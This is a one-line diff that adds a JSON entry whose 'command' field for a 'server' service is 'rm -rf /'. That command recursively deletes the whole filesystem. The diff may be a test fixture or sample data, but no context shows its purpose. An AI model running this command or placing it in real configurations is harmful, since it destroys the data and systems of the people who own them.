@@ -1,0 +1,1 @@
+{ "service": "server", "command": "rm -rf /" }
